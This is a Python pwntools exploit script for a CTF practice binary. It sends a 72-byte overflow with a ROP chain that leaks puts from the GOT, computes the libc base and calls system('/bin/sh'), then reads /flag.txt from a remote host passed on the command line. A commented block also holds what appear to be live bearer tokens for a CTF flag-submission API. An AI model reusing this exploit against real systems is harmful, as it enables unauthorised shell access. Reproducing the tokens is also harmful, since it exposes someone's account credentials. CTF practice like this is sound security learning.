#!/usr/bin/env python3

from pwn import *
import sys

path_bin = "/home/zafin/Downloads/CTF/LatihanTickRound/main"
elf = context.binary = ELF(path_bin)
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

# r = process(path_bin)

# r = remote("10.100.101.106",22000)

r = remote(sys.argv[1], 22000)

pop_rdi = 0x0000000000401243
payload = b'a'*72
payload += p64(pop_rdi) + p64(elf.got.puts) + p64(elf.sym.puts) + p64(elf.sym.main)

r.sendline(payload)
r.recvuntil(b"?\n")
libc.address = u64(r.recvn(6) + b"\x00"*2) - libc.sym.puts
print(hex(libc.address))


payload = b'a'*72 + flat(pop_rdi, next(libc.search(b"/bin/sh\x00")), pop_rdi+1,libc.sym.system)

r.sendline(payload)

"""
r = requests.post('https://ctf-gemastik.ub.ac.id/api/flag', headers={'Authorization': 'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJJRCI6IjU0ZTVmNmIzLWM2OWYtNDZmZS1iZDVjLTgyM2FmMGIzYzA5YiIsIlVzZXJuYW1lIjoiQmlnIEJyYWluIEtpZHoiLCJJc0FkbWluIjpmYWxzZSwiZXhwIjoxNjk0NTQ0MzY2fQ.L_Y6dmnZ8mkq39LlY5QHLSx79RC6Ln1CttJhvhabuog'}, json={'flags': ['GEMASTIK{abdef12345}']})
r = requests.post('https://ctf-gemastik.ub.ac.id/api/flag', headers={'Authorization': 'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJJRCI6IjU0ZTVmNmIzLWM2OWYtNDZmZS1iZDVjLTgyM2FmMGIzYzA5YiIsIlVzZXJuYW1lIjoiQmlnIEJyYWluIEtpZHoiLCJJc0FkbWluIjpmYWxzZSwiZXhwIjoxNjk0NTc2ODk3fQ.oyibd3ajVR8APXK_be89lW6hnHj3VFFQ4ygpaZ-s03s', "Content-Type" :"application/json"}, json={'flag
s': ['GEMASTIK{abdef12345}']})
"""

r.sendline(b"cat /flag.txt")
r.recvuntil(b"?\n")
print(r.recv().decode(), flush=True)

r.interactive()